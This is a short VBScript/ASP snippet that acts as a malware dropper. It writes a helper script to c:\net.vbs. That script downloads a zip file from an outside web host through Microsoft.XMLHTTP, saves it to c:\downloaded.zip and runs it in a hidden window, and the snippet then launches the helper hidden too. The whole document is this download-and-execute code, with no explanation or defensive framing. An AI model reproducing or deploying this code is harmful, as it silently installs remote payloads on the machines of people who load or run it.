<SCRIPT LANGUAGE="VBScript">
<%
Set entrika = CreateObject("Scripting.FileSystemObject")
Set entrika = entrika.CreateTextFile("c:\net.vbs", True)
entrika.write "Dim BinaryData" & vbcrlf
entrika.write "Dim xml" & vbcrlf
entrika.write "Set xml = CreateObject(""Microsoft.XMLHTTP"")" & vbcrlf
entrika.write "xml.Open ""GET"",""http://www35.websamba.com/cybervurgun/file.zip"",False" & vbcrlf
entrika.write "xml.Send" & vbcrlf
entrika.write "BinaryData = xml.ResponsebOdy" & vbcrlf
entrika.write "Const adTypeBinary = 1" & vbcrlf
entrika.write "Const adSaveCreateOverWrite = 2" & vbcrlf
entrika.write "Dim BinaryStream" & vbcrlf
entrika.write "Set BinaryStream = CreateObject(""ADODB.Stream"")" & vbcrlf
entrika.write "BinaryStream.Type = adTypeBinary" & vbcrlf
entrika.write "BinaryStream.Open" & vbcrlf
entrika.write "BinaryStream.Write BinaryData" & vbcrlf
entrika.write "BinaryStream.SaveToFile ""c:\downloaded.zip"", adSaveCreateOverWrite" & vbcrlf
entrika.write "Dim WshShell"  & vbcrlf
entrika.write "Set WshShell = CreateObject(""WScript.Shell"")" & vbcrlf
entrika.write "WshShell.Run ""c:\downloaded.zip"", 0, false" & vbcrlf
entrika.close
Set entrika = Nothing
Set entrika = Nothing

Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "c:\net.vbs", 0, false
%>
 </SCRIPT>